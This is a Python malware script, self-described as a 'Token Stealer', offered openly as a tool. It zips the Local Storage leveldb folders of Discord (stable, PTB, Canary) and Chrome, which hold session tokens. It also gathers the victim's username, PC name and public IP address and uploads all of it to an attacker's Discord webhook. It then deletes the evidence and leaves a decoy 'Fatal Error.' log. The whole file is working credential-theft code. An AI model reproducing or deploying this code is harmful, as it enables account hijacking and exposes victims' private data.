# 1-28-19
# Project: Token Stealer
# Authors: DeadBread76 | Synchronocy
# IDLE 3.6.5 (32/64)
# Essentially uhh. no comment.
# requirements as follows.

import os
import sys
import shutil
import zipfile
from requests import get
from dhooks import Webhook, File

hook = Webhook('WEBHOOK HERE')
path = os.getenv('APPDATA')
localpath = os.getenv('LOCALAPPDATA')
user = os.getenv('username')
pc_name = os.environ['COMPUTERNAME']
temp_dir = localpath+"\\temp\\"
tokendir = path+"\\Discord\\Local Storage\\leveldb\\"
ptbtokendir = path+"\\discordptb\\Local Storage\\leveldb\\"
canarytokendir = path+"\\discordcanary\\Local Storage\\leveldb\\"
chromedir = localpath + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\"

zipf = temp_dir+"logs.zip"
if os.path.isfile(temp_dir+"run.log"):
  sys.exit()
ip = get('https://api.ipify.org').text

if os.path.isfile(zipf):
  os.remove(zipf)

zip = zipfile.ZipFile(zipf,'a')

if os.path.isdir(tokendir):
  discordinst = True
  try:
    for root, dirs, files in os.walk(tokendir):
      for file in files:
        zip.write(tokendir+file)
  except Exception:
    failed = True
else:
  discordinst = False
  
if os.path.isdir(ptbtokendir):
  ptbinst = True
  try:
     for root, dirs, files in os.walk(ptbtokendir):
       for file in files:
         zip.write(ptbtokendir+file)
  except Exception:
     ptbfailed = True
else:
  ptbinst = False
  
if os.path.isdir(canarytokendir):
  canaryinst = True
  try:
     for root, dirs, files in os.walk(canarytokendir):
       for file in files:
         zip.write(canarytokendir+file)
  except Exception:
     canaryfailed = True
else:
  canaryinst = False
 
if os.path.isdir(chromedir):
  chromeinst = True
  try:
     for root, dirs, files in os.walk(chromedir):
       for file in files:
         zip.write(chromedir+file)
  except Exception:
     chromefailed = True
else:
  chromeinst = False
zip.close()

def main():
  with open (temp_dir+"run.log", 'w+') as handle:
    handle.write("Fatal Error.")
    handle.close()
  hook.send('```css\nToken Grabbed! \n\nUsername: '+str(user) + '\nPC Name: ' + pc_name + '\nIP Address: {}'.format(ip) +'\n\nZip File:```')
  try:
    hook.send(file = File(zipf, name=str(user)+" Logs.zip"))
  except:
    hook.send('```css\nThere was an error obtaining the zip.```')
  if discordinst and ptbinst and canaryinst and chromeinst == False:
    hook.send("```css\nUser had nothing installed```")
  try:
    os.remove(zipf)
  except:
    return ''

main()
